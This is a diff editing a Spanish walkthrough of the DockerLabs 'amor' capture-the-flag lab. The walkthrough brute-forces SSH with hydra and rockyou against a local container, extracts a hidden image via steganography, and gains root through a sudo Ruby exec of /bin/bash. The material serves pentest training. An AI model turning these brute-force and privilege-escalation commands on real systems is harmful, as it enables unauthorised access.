@@ -5,9 +5,7 @@
     🛠 Prerrequisitos
 Sistema base: Kali Linux
 
-Docker instalado:
 
-sudo apt install docker.io
 ## RTA
 
 Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto de dificultad Fácil. Tiene como objetivo introducir herramientas básicas de pentesting sobre entornos Docker usando técnicas de escaneo, fuerza bruta y esteganografía.
@@ -33,15 +31,21 @@ Este laboratorio forma parte de la plataforma DockerLabs y corresponde a un reto
 
 
 scp -r amor kali@192.168.1.12:/home/kali/Documents/
-Descomprimir recursos (si aplica):
+Descomprimir recursos
 
+## b. Docker instalado:
+
+sudo apt install docker.io
 
 unzip amor.zip
 Otorgar permisos y ejecutar:
 
-
+cd Documents/amor
 chmod +x auto_deploy.sh
 ./auto_deploy.sh amor.tar
+
+![DESPLIEGUE](Imagenes/ACCC.png)
+
 🔍 Reconocimiento
 Obtener interfaz:
 
@@ -68,15 +72,12 @@ Usuarios encontrados en el HTML del sitio: carlota y juan.
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
 Accedemos vía SSH:
 
-
 ssh carlota@172.17.0.2
 🖼 Extracción de Evidencia
 Navegamos al directorio de imágenes:
 
-
 cd /carlota/Desktop/fotos/vacaciones
 Transferimos la imagen:
-
 
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
 Inspeccionamos el tipo de archivo:
@@ -99,7 +100,6 @@ Accedemos como otro usuario:
 su oscar
 ## d.Comprobamos acceso con sudo:
 
-
 sudo -l
 Acceso a bash mediante Ruby:
 
@@ -107,11 +107,8 @@ Acceso a bash mediante Ruby:
 sudo /usr/bin/ruby -e 'exec "/bin/bash"'
 Verificamos identidad:
 
-
 whoami
 
-🧾 Cuadro de Herramientas Utilizadas
-Se puede consultar el siguiente archivo Excel para la definición, funcionalidad y casos de uso de cada herramienta empleada: Resumen_Herramientas_DockerLabs.xlsx.
 
 
 
